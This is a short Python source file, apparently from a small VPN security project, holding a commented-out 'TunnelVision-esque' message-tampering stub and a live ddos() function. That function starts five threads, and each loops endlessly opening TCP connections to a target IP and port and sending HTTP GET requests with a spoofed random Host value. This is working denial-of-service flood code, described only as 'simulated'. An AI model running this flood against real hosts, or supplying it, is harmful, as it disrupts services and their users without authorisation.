import socket
import threading
import random
import struct

attack_num = 0


# def tunnelvision(VPN_IP, VPN_PORT):
#     print("Starting simulated TunnelVision-esque attack")
#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tv_s:
#         tv_s.connect((VPN_IP, VPN_PORT))
#         hacked_message = f"Hacked: {random.getrandbits(128)}"
#         print("Eavesdropper detected.")
#         tv_s.sendall(bytes(hacked_message, 'utf-8'))
#         print("Message intercepted and tampered.")
#         data = tv_s.recv(1024).decode("utf-8")
#         print(f"Infected reponse: {data} [{len(data)}]")

#modeled after NeuralNine and Tommaso Bona
def ddos(VPN_IP, VPN_PORT):


    # print("Starting simulated DOS attack. Please exit if you do not wish to continue")
    fake_ip = str(socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff))))
    VPN_IP = str(VPN_IP)
    VPN_PORT = int(VPN_PORT)
    # attack_num = 0

   


    def attack():
        while True: 
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((VPN_IP, VPN_PORT))
            s.sendto(("GET /" + VPN_IP + " HTTP/1.1\r\n").encode('ascii'), (VPN_IP, VPN_PORT))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (VPN_IP, VPN_PORT))
            
            global attack_num
            attack_num += 1
            print(attack_num)

            s.close()
    
    for _ in range(5):
        thread = threading.Thread(target=attack)
        thread.start()
        



